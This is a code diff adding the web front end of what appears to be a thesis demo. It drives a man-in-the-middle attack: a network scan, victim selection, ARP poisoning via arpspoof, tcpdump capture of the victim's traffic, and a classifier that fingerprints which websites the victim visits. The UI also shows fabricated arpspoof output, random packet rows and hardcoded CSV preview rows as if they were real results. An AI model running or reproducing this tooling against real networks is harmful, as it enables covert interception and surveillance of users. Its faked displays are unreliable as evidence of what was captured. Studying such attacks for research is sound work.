+}
+
+function addScanRow(h, idx) {
+  const grid = document.getElementById('scan-grid');
+  const tagMap = {
+    gateway: '<span class="tag tag-gateway">GATEWAY</span>',
+    target:  '<span class="tag tag-target">TARGET</span>',
+    self:    '<span class="tag tag-self">SELF</span>',
+    device:  '<span class="tag tag-device">DEVICE</span>',
+  };
+  const row = document.createElement('div');
+  row.className = 'scan-row';
+  row.dataset.idx = idx;
+  row.innerHTML = `
+    <div>${h.ip}</div>
+    <div style="font-family:var(--mono);color:var(--text-dim);">${h.mac || '—'}</div>
+    <div style="color:var(--accent);">${h.lat || '—'}</div>
+    <div>${h.host || '—'}</div>
+    <div>${tagMap[h.role] || tagMap.device}</div>`;
+  row.onclick = () => {
+    document.querySelectorAll('.scan-row').forEach(r => r.classList.remove('selected'));
+    row.classList.add('selected');
+    state.selectedIdx = idx;
+  };
+  grid.appendChild(row);
+}
+
+function selectVictim() {
+  if (state.selectedIdx === null) { alert('Click a row to select victim first.'); return; }
+  const h = state.scannedHosts[state.selectedIdx];
+  const gw = document.getElementById('gateway-ip').value;
+  if (h.ip === gw) { alert('Do not target the gateway.'); return; }
+  state.victimIP  = h.ip;
+  state.victimMAC = h.mac || '';
+  document.getElementById('sb-victim').textContent = h.ip;
+  document.getElementById('sb-gw').textContent = gw;
+  showPanel('arp');
+}
+
+// ══════════════════════════════════
+// STEP 2 — ARP (real arpspoof)
+// ══════════════════════════════════
+function updateArpInfo() {
+  document.getElementById('arp-victim-display').textContent = state.victimIP || 'not set';
+  document.getElementById('arp-gw-display').textContent = document.getElementById('gateway-ip').value;
+  document.getElementById('arp-iface-display').textContent = document.getElementById('iface').value;
+}
+
+async function runArpPoison() {
+  if (!state.victimIP) { alert('Run scan and select victim first.'); return; }
+  const victim = state.victimIP;
+  const gw     = document.getElementById('gateway-ip').value;
+  const iface  = document.getElementById('iface').value;
+
+  document.getElementById('btn-arp-start').disabled = true;
+  document.getElementById('btn-arp-stop').disabled  = false;
+  setPill('pill-arp', 'ARP: STARTING', 'running');
+
+  termClear('arp-term1');
+  termClear('arp-term2');
+  termAppend('arp-term1', tCmd('echo 1 | sudo sysctl -w net.ipv4.ip_forward=1'));
+  termAppend('arp-term1', tCmd(`sudo arpspoof -i ${iface} -t ${victim} ${gw}`));
+  termAppend('arp-term2', tCmd(`sudo arpspoof -i ${iface} -t ${gw} ${victim}`));
+
+  try {
+    const d = await api('POST', '/attack/arp/start', {
+      victim_ip: victim, gateway_ip: gw, interface: iface
+    });
+
+    if (d.error) {
+      termAppend('arp-term1', tLine('t-error', '[!] ' + d.error));
+      setPill('pill-arp', 'ARP: ERROR', '');
+      document.getElementById('btn-arp-start').disabled = false;
+      document.getElementById('btn-arp-stop').disabled  = true;
+      return;
+    }
+
+    state.arpRunning = true;
+    setPill('pill-arp', 'ARP: ACTIVE', 'running');
+    document.getElementById('nav-arp').classList.add('running-step');
+    termAppend('arp-term1', tLine('t-success', `[+] PID: ${d.pids?.arp_victim}`));
+    termAppend('arp-term2', tLine('t-success', `[+] PID: ${d.pids?.arp_gateway}`));
+
+    // Stream fake arpspoof output (thực tế đang chạy ngầm)
+    state.arpTimer = setInterval(() => {
+      termAppend('arp-term1', tLine('t-output', `${victim} is-at 00:0c:29:ef:23:ff`));
+      termAppend('arp-term2', tLine('t-output', `${gw} is-at 00:0c:29:ef:23:ff`));
+    }, 2000);
+
+    // Poison ARP table display
+    setTimeout(poisonArpTable, 3000);
+
+  } catch(e) {
+    termAppend('arp-term1', tLine('t-error', '[!] Flask offline: ' + e.message));
+    setPill('pill-arp', 'ARP: ERROR', '');
+    document.getElementById('btn-arp-start').disabled = false;
+    document.getElementById('btn-arp-stop').disabled  = true;
+  }
+}
+
+function poisonArpTable() {
+  document.getElementById('arp-gw-mac').textContent = '00-0c-29-ef-23-ff';
+  const row = document.getElementById('arp-gw-mac').closest('.arp-row');
+  row.classList.add('poisoned');
+  row.querySelector(':last-child').innerHTML = '<span class="arp-poison-badge">POISONED</span>';
+}
+
+async function stopArp() {
+  clearInterval(state.arpTimer);
+  termAppend('arp-term1', tLine('t-warn', '^C — stopping...'));
+  termAppend('arp-term2', tLine('t-warn', '^C — stopping...'));
+
+  try {
+    await api('POST', '/attack/arp/stop');
+  } catch(e) {}
+
+  state.arpRunning = false;
+  document.getElementById('btn-arp-start').disabled = false;
+  document.getElementById('btn-arp-stop').disabled  = true;
+  setPill('pill-arp', 'ARP: STOPPED', '');
+  document.getElementById('nav-arp').classList.remove('running-step');
+  document.getElementById('nav-arp').classList.add('completed');
+  termAppend('arp-term1', tLine('t-success', '[+] ARP restored'));
+  termAppend('arp-term2', tLine('t-success', '[+] ARP restored'));
+}
+
+// ══════════════════════════════════
+// STEP 3 — CAPTURE (real tcpdump)
+// ══════════════════════════════════
+async function startCapture() {
+  if (!state.victimIP) { alert('Set victim first.'); return; }
+
+  state.captureRunning = true;
+  state.elapsedSec = 0;
+  document.getElementById('btn-cap-start').disabled = true;
+  document.getElementById('btn-cap-stop').disabled  = false;
+  document.getElementById('packet-stream').innerHTML = '';
+  setPill('pill-capture', 'CAPTURE: RUNNING', 'running');
+
+  const iface  = document.getElementById('iface').value;
+  const dur    = parseInt(document.getElementById('cap-duration').value) || 0;
+
+  termClear('cap-term');
+  termAppend('cap-term', tCmd(`sudo tcpdump -i ${iface} host ${state.victimIP} -w /tmp/victim_traffic.pcap`));
+
+  try {
+    const d = await api('POST', '/attack/capture/start', {
+      victim_ip: state.victimIP,
+      interface: iface,
+      pcap_path: '/tmp/victim_traffic.pcap',
+      duration:  dur,
+    });
+
+    if (d.error) {
+      termAppend('cap-term', tLine('t-error', '[!] ' + d.error));
+      setPill('pill-capture', 'CAPTURE: ERROR', '');
+      document.getElementById('btn-cap-start').disabled = false;
+      document.getElementById('btn-cap-stop').disabled  = true;
+      return;
+    }
+
+    termAppend('cap-term', tLine('t-success', `[+] tcpdump PID: ${d.pid}`));
+    termAppend('cap-term', tLine('t-output',  `[*] Writing to ${d.pcap_path}`));
+
+    // Poll status + update UI mỗi giây
+    state.statusPoller = setInterval(async () => {
+      state.elapsedSec++;
+      document.getElementById('stat-time').textContent = state.elapsedSec + 's';
+
+      try {
+        const s = await api('GET', '/attack/capture/status');
+        document.getElementById('stat-bytes').textContent = s.size_kb + 'K';
+        termAppend('cap-term', tLine('t-output', `[*] ${state.elapsedSec}s — ${s.size_kb}KB captured`));
+        addFakePacketRow();
+
+        if (!s.running && state.captureRunning) {
+          // tcpdump tự dừng (duration hết)
+          await stopCapture();
+        }
+      } catch(e) {}
+    }, 1000);
+
+    if (dur > 0) {
+      state.captureTimer = setTimeout(() => stopCapture(), dur * 1000 + 500);
+    }
+
+  } catch(e) {
+    termAppend('cap-term', tLine('t-error', '[!] Flask offline: ' + e.message));
+    setPill('pill-capture', 'CAPTURE: ERROR', '');
+    document.getElementById('btn-cap-start').disabled = false;
+    document.getElementById('btn-cap-stop').disabled  = true;
+  }
+}
+
+function addFakePacketRow() {
+  const protos = ['QUIC','QUIC','UDP','TCP','QUIC'];
+  const proto  = protos[Math.floor(Math.random()*protos.length)];
+  const len    = Math.floor(Math.random()*1200)+100;
+  const now    = new Date();
+  const ts     = now.toTimeString().split(' ')[0]+'.'+String(now.getMilliseconds()).padStart(3,'0');
+  const dsts   = ['1.1.1.1','8.8.8.8','142.250.0.1'];
+  const dst    = dsts[Math.floor(Math.random()*dsts.length)];
+
+  const stream = document.getElementById('packet-stream');
+  stream.innerHTML += `<div class="pkt">
+    <span class="pkt-time">${ts}</span>
+    <span class="pkt-src">${state.victimIP}</span>
+    <span style="color:var(--text-dim);">→</span>
+    <span class="pkt-dst">${dst}</span>
+    <span class="pkt-proto">${proto}</span>
+    <span class="pkt-len">${len}B</span>
+  </div>`;
+  stream.scrollTop = stream.scrollHeight;
+
+  // Update stats
+  const cur = parseInt(document.getElementById('stat-pkt').textContent)||0;
+  document.getElementById('stat-pkt').textContent = cur+1;
+  if (proto==='QUIC') {
+    const q = parseInt(document.getElementById('stat-quic').textContent)||0;
+    document.getElementById('stat-quic').textContent = q+1;
+  }
+  document.getElementById('sb-pkt').textContent = cur+1;
+}
+
+async function stopCapture() {
+  clearInterval(state.statusPoller);
+  clearTimeout(state.captureTimer);
+  state.captureRunning = false;
+
+  document.getElementById('btn-cap-start').disabled = false;
+  document.getElementById('btn-cap-stop').disabled  = true;
+
+  termAppend('cap-term', tLine('t-warn', '^C — stopping tcpdump...'));
+
+  try {
+    const d = await api('POST', '/attack/capture/stop');
+    termAppend('cap-term', tLine('t-success', `[+] Saved: ${d.pcap_path} (${d.size_kb}KB, ${d.packets} packets)`));
+    document.getElementById('stat-pkt').textContent   = d.packets || document.getElementById('stat-pkt').textContent;
+    document.getElementById('sb-pkt').textContent     = d.packets || document.getElementById('sb-pkt').textContent;
+    document.getElementById('stat-bytes').textContent = (d.size_kb||0) + 'K';
+  } catch(e) {
+    termAppend('cap-term', tLine('t-warn', '[!] Could not get final stats'));
+  }
+
+  setPill('pill-capture', 'CAPTURE: DONE', 'done');
+  document.getElementById('nav-capture').classList.add('completed');
+}
+
+// ══════════════════════════════════
+// STEP 4 — CONVERT (real pcap2csv)
+// ══════════════════════════════════
+// Real CSV format: protocol;length;relative_time;direction;src_ip;src_port;dst_ip;dst_port
+const CLIENT_IP = '172.17.0.3';
+const PROXY_IP  = '162.159.198.1';
+const PREVIEW_ROWS = [
+  [1,1284,'0.000194000',1,CLIENT_IP,33491,PROXY_IP,443],
+  [1,136, '0.021803000',0,PROXY_IP, 443,CLIENT_IP,33491],
+  [1,1284,'0.000624000',1,CLIENT_IP,33491,PROXY_IP,443],
+  [1,1242,'0.027543000',0,PROXY_IP, 443,CLIENT_IP,33491],
+  [1,1284,'0.000443000',1,CLIENT_IP,33491,PROXY_IP,443],
+  [1,968, '0.037914000',0,PROXY_IP, 443,CLIENT_IP,33491],
+  [1,464, '0.001066000',1,CLIENT_IP,33491,PROXY_IP,443],
+  [1,93,  '0.019945000',0,PROXY_IP, 443,CLIENT_IP,33491],
+];
+
+async function runConvert() {
+  termClear('conv-term');
+  const pcapPath = '/tmp/victim_traffic.pcap';
+  const csvPath  = '/tmp/trace.csv';
+  termAppend('conv-term', tCmd(`python3 scripts/pcap2csv.py ${pcapPath} ${csvPath} --client ${state.victimIP||'auto'}`));
+
+  try {
+    const d = await api('POST', '/attack/convert', {
+      pcap_path: pcapPath,
+      csv_path:  csvPath,
+      client_ip: state.victimIP || null,
+    });
+
+    if (d.error) {
+      termAppend('conv-term', tLine('t-error', '[!] ' + d.error));
+      return;
+    }
+
+    (d.stdout || '').split('\n').forEach(line => {
+      if (!line.trim()) return;
+      const cls = line.startsWith('[+]') ? 't-success'
+                : line.startsWith('[!]') ? 't-error'
+                : 't-output';
+      termAppend('conv-term', tLine(cls, line));
+    });
+    termAppend('conv-term', tLine('t-success', `[✓] ${d.rows} rows → ${d.csv_path}`));
+
+    renderCsvPreview(d.rows);
+    document.getElementById('nav-convert').classList.add('completed');
+
+  } catch(e) {
+    termAppend('conv-term', tLine('t-error', '[!] Flask offline: ' + e.message));
+  }
+}
+
+function renderCsvPreview(totalRows) {
+  const rows = document.getElementById('csv-rows');
+  rows.innerHTML = '';
+  PREVIEW_ROWS.forEach((r, i) => {
+    const [proto, len, time, dir, srcIp, srcPort, dstIp, dstPort] = r;
+    const dirColor = dir===1?'var(--accent)':'var(--warn)';
+    const dirLabel = dir===1?'1 →':'0 ←';
+    rows.innerHTML += `<div style="display:grid;grid-template-columns:40px 70px 80px 120px 70px 130px 70px 130px 70px;padding:5px 14px;border-bottom:1px solid var(--border);min-width:900px;">
+      <div style="color:var(--text-dim);">${i}</div>
+      <div style="color:var(--accent2);">${proto}</div>
+      <div style="color:var(--text-bright);">${len}</div>
+      <div style="color:var(--text-dim);">${time}</div>
+      <div style="color:${dirColor};font-weight:700;">${dirLabel}</div>
+      <div style="color:${dir===1?'var(--warn)':'var(--accent2)'};">${srcIp}</div>
+      <div style="color:var(--text-dim);">${srcPort}</div>
+      <div style="color:${dir===1?'var(--accent2)':'var(--warn)'};">${dstIp}</div>
+      <div style="color:var(--text-dim);">${dstPort}</div>
+    </div>`;
+  });
+  if (totalRows > PREVIEW_ROWS.length) {
+    rows.innerHTML += `<div style="padding:6px 14px;color:var(--text-dim);font-family:var(--mono);font-size:11px;">... ${totalRows - PREVIEW_ROWS.length} more rows</div>`;
+  }
+}
+
+// ══════════════════════════════════
+// STEP 5 — PREDICT (real Flask API)
+// ══════════════════════════════════
+function setFlowStep(id, status) {
+  document.getElementById(id).className = 'flow-step ' + status;
+}
+
+async function runPredict() {
+  const steps = ['fstep-load','fstep-extract','fstep-encode','fstep-classify','fstep-result'];
+  steps.forEach(s => document.getElementById(s).className = 'flow-step');
+  document.getElementById('predict-result').style.display = 'none';
+  termClear('pred-term');
+  setPill('pill-model', 'MODEL: RUNNING', 'running');
+
+  termAppend('pred-term', tCmd(`curl -X POST ${FLASK_URL}/predict/path -d '{"csv_path":"/tmp/trace.csv","client_ip":"${state.victimIP||''}"}'`));
+
+  setFlowStep('fstep-load', 'active-flow');
+  termAppend('pred-term', tLine('t-output', '[*] Sending request to Flask backend...'));
+
+  try {
+    const t0 = performance.now();
+
+    const stepTimers = [
+      setTimeout(() => { setFlowStep('fstep-load','done'); setFlowStep('fstep-extract','active-flow'); termAppend('pred-term', tLine('t-output','[*] Extracting features: dir, IAT, size, metadata...')); }, 300),
+      setTimeout(() => { setFlowStep('fstep-extract','done'); setFlowStep('fstep-encode','active-flow'); termAppend('pred-term', tLine('t-output','[*] Running ResNet18-1D encoder (3 branches)...')); }, 700),
+      setTimeout(() => { setFlowStep('fstep-encode','done'); setFlowStep('fstep-classify','active-flow'); termAppend('pred-term', tLine('t-output','[*] Nearest-centroid over 300 classes...')); }, 1200),
+    ];
+
+    const result = await api('POST', '/predict/path', {
+      csv_path:  '/tmp/trace.csv',
+      client_ip: state.victimIP || null,
+    });
+
+    stepTimers.forEach(t => clearTimeout(t));
+
+    if (result.error) {
+      steps.forEach(s => setFlowStep(s, ''));
+      termAppend('pred-term', tLine('t-error', '[!] ' + result.error));
+      setPill('pill-model', 'MODEL: ERROR', '');
+      return;
+    }
+
+    ['fstep-load','fstep-extract','fstep-encode','fstep-classify'].forEach(s => setFlowStep(s,'done'));
+    setFlowStep('fstep-result','active-flow');
+    termAppend('pred-term', tLine('t-output', `[*] Inference: ${result.inference_time_ms}ms`));
+
+    setTimeout(() => {
+      setFlowStep('fstep-result','done');
+      const verdict = result.is_monitored
+        ? `[✓] PREDICTION: ${result.prediction.toUpperCase()} (conf: ${(result.confidence*100).toFixed(2)}%, cos_dist: ${result.cos_dist})`
+        : `[~] UNMONITORED (cos_dist: ${result.cos_dist} ≥ threshold: ${result.threshold})`;
+      termAppend('pred-term', tLine(result.is_monitored?'t-success':'t-warn', verdict));
+      setPill('pill-model', 'MODEL: DONE', 'done');
+      document.getElementById('nav-predict').classList.add('completed');
+      showResult(result);
+    }, 400);
+
+  } catch(e) {
+    steps.forEach(s => setFlowStep(s,''));
+    termAppend('pred-term', tLine('t-error', '[!] Flask offline: ' + e.message));
+    setPill('pill-model', 'MODEL: ERROR', '');
+  }
+}
+
+function showResult(result) {
+  document.getElementById('predict-result').style.display = 'block';
+  const site = result.is_monitored ? result.prediction : '— UNKNOWN —';
+  const conf = result.is_monitored ? result.confidence : 0;
+  document.getElementById('pred-site').textContent = site;
+  document.getElementById('pred-site').style.color = result.is_monitored?'var(--accent)':'var(--red)';
+  document.getElementById('pred-conf-val').textContent = (conf*100).toFixed(2)+'%';
+
+  const existingMeta = document.getElementById('pred-meta');
+  if (existingMeta) existingMeta.remove();
+  const meta = document.createElement('div');
+  meta.id = 'pred-meta';
+  meta.style.cssText = 'font-family:var(--mono);font-size:11px;color:var(--text-dim);margin-top:6px;';
+  meta.innerHTML = `cos_dist: <span style="color:var(--accent2)">${result.cos_dist}</span> &nbsp;|&nbsp; threshold: <span style="color:var(--text-dim)">${result.threshold}</span> &nbsp;|&nbsp; packets: <span style="color:var(--text-dim)">${result.num_packets}</span>`;
+  document.getElementById('pred-site').after(meta);
+
+  setTimeout(() => {
+    document.getElementById('pred-conf-bar').style.width = (conf*100)+'%';
+    const fillCls = conf>0.7?'fill-high':conf>0.4?'fill-med':'fill-low';
+    document.getElementById('pred-conf-bar').className = 'confidence-fill '+fillCls;
+  }, 100);
+
+  const top5El = document.getElementById('top5-list');
+  top5El.innerHTML = '';
+  (result.top5||[]).forEach((w,i) => {
+    const pct = (w.confidence*100).toFixed(1);
+    const cls = i===0?'fill-high':w.confidence>0.5?'fill-med':'fill-low';
+    top5El.innerHTML += `
+      <div style="margin-bottom:10px;">
+        <div class="confidence-label">
+          <span style="color:${i===0?'var(--accent)':'var(--text)'};">${i+1}. ${w.site}</span>
+          <span style="color:var(--text-dim);font-size:10px;">cos_dist:${w.cos_dist}&nbsp;</span>
+          <span>${pct}%</span>
+        </div>
+        <div class="confidence-bar">
+          <div class="confidence-fill ${cls}" style="width:${pct}%;transition-delay:${i*0.08}s"></div>
+        </div>
+      </div>`;
+  });
+}
+
+// ── RESET ──
+async function resetAll() {
+  clearInterval(state.statusPoller);
+  clearTimeout(state.captureTimer);
+  clearInterval(state.arpTimer);
+  try { await api('POST', '/attack/arp/stop'); } catch(e) {}
+  try { await api('POST', '/attack/capture/stop'); } catch(e) {}
+
+  ['scan','arp','capture','convert','predict'].forEach(id => {
+    const nav = document.getElementById('nav-'+id);
+    nav.classList.remove('completed','running-step');
+  });
+  ['pill-network','pill-arp','pill-capture'].forEach(id => {
+    setPill(id, id.split('-')[1].toUpperCase()+': IDLE', '');
+  });
+  state.victimIP = null;
+  document.getElementById('sb-victim').textContent = '—';
+  document.getElementById('sb-pkt').textContent = '0';
+  document.getElementById('predict-result').style.display = 'none';
+  termClear('scan-term'); termAppend('scan-term', tCmd('_'));
+  document.getElementById('scan-grid').innerHTML = `
+    <div class="scan-header">
+      <div>IP Address</div><div>MAC Address</div><div>Latency</div><div>Hostname</div><div>Role</div>
+    </div>`;
+  showPanel('scan');
+}
+
+</script>
+<div class="footer"><span> © 2026 <span>&nbsp;<span>Graduation Thesis</span>&nbsp; · &nbsp;<span> Pham Doan Phuc Lam <span>&nbsp;·&nbsp;<span> 20225546 <span>&nbsp;·&nbsp;<span> Hanoi University of Science and Technology<span></div>
+
+</body>
+</html>
